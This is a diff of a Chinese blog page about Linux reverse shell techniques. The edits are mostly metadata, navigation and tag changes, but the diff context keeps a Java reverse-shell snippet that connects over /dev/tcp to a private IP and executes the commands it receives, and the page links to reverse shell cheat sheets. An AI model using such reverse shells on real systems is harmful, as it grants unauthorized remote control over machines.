@@ -15,7 +15,7 @@
 <meta property="og:url" content="https://bypupil.github.io/2017/09/23/不会这几条命令，如何内网搅屎/index.html">
 <meta property="og:site_name" content="ByPupil&#39;s blog">
 <meta property="og:description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
-<meta property="og:updated_time" content="2017-09-23T15:40:29.000Z">
+<meta property="og:updated_time" content="2017-09-23T15:43:56.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="不会这几条命令，如何内网搅屎">
 <meta name="twitter:description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
@@ -198,8 +198,7 @@
 <p><strong>Java</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.8.31/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
 <p>java版本的，我也没测试成功。本人太愚。</p>
-<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">Linux下反弹shell方法</a></p>
-<p><a href="http://www.linuxidc.com/Linux/2016-11/136993.htm" target="_blank" rel="external">Linux里的2&gt;&amp;1究竟是什么</a></p>
+<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">Linux下反弹shell方法</a><br><a href="http://www.linuxidc.com/Linux/2016-11/136993.htm" target="_blank" rel="external">Linux里的2&gt;&amp;1究竟是什么</a></p>
 
       
 
@@ -303,6 +302,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2017/09/24/不会编程的大四狗/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          不会编程的大四狗
+        
+      </div>
+    </a>
   
   
     <a href="/2017/09/18/CVE-2017-9603-分析/" id="article-nav-older" class="article-nav-link-wrap">
@@ -432,7 +440,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+                <a href="javascript:void(0)" class="js-tag color1">code audit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">programme</a>
               </li>
              
               <li class="article-tag-list-item">
